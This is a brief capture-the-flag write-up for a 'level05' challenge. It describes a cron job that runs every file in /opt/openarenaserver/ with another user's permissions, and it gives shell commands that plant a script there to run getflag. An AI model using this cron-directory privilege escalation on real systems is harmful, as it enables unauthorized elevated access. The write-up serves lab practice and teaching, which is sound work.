By looking around, we found a file : /rofs/var/mail/level05. 

This file is a cronjob that executes the /usr/sbin/openarenaserver file every 2 minutes with flag05's permissions.
This file executes every file located in the /opt/openarenaserver/ directory.

The idea is to create a script in the /opt/openarenaserver/ directory that will execute the getflag command.
	echo 'getflag > /tmp/flag_output.txt' > /opt/openarenaserver/getflag.sh
	chmod +x /opt/openarenaserver/getflag.sh
	cat /tmp/flag_output.txt
